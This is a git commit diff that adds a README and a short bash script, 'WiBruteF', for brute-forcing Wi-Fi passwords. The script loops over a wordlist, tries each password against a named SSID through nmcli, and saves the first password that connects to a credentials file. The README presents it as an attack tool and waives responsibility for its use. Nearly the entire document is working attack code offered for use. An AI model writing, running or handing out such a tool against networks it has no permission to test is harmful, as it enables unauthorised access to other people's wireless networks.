8e25d81111d36d5f289c6da1ae0d5f1a41895b05
o-sec <jokromar4@gmail.com>
2024-06-25 21:10:01 +0100

    first commit

---
+++ README.md
@@ -0,0 +1,13 @@
+# WiBruteF
+wifi password bruteforce
+### about :
+WiBruteF is a script writen in bash to implement a wifi bruteforce attack by abusing the nmcli utility in linux to try to connect to wifi network with a list of passwords (wordlistfile) , its usefull in case you wanna try a list of common passwords against a wifi network .
+### installation :
+clone github repo
+```
+git clone https://github.com/o-sec/WiBruteF.git
+```
+
+### disclaimer :
+i am not responsable for whatever you do with this tool !
+
---
+++ WiBruteF.sh
@@ -0,0 +1,41 @@
+#!/usr/bin/bash
+
+ssid=$1
+wordlist=$2
+
+usage() {
+echo "usage :"
+echo
+echo "  WiBruteF.sh <SSID> <WORDLIST>"
+}
+
+
+function bruteforce {
+
+for password in $(cat $wordlist);
+do
+trytoconnect=$(nmcli --wait 3 dev wifi connect $ssid password $password &> /dev/null)
+result=$?
+if [ $result = 0 ];
+then
+echo "successfully connected ! using password : $password "
+echo "ssid : $ssid " > $ssid-cred.txt
+echo "password : $password" >> $ssid-cred.txt
+break
+else
+echo "failed to connect using password : $password "
+fi
+done;
+
+}
+
+
+
+if [ $# -lt 2 ];
+then
+usage
+elif [ $# -eq 2 ];
+then
+echo "targeting : [ $1 ] wifi network "
+bruteforce
+fi
